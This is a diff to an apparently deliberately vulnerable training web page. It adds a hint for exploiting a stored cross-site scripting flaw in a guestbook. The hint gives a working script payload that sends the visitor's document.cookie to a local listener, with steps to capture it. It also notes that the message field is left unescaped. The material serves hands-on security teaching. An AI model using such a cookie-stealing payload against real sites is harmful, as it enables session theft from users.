@@ -22,7 +22,16 @@ if (isset($_GET['q'])) {
 </div>
 
 <div class="card">
-  <h2>Guestbook</h2>
+  <h2>Guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
+  <details class="muted" style="margin-bottom:10px">
+    <summary style="cursor:pointer">💡 How to steal data with stored XSS (click)</summary>
+    <ol style="line-height:1.8">
+      <li>On Kali, start a listener: <code>python3 -m http.server 9001</code></li>
+      <li>Post this as the <b>message</b> (not the name — the name is escaped):<br>
+          <code>&lt;script&gt;new Image().src='http://127.0.0.1:9001/steal?c='+document.cookie&lt;/script&gt;</code></li>
+      <li><b>Reload this page</b> → your listener logs <code>GET /steal?c=flag=FLAG{...}</code>. That cookie is the flag (a real session in a live app).</li>
+    </ol>
+  </details>
   <form method="post">
     <input name="author" placeholder="name">
     <br><br><textarea name="body" placeholder="leave a message"></textarea>
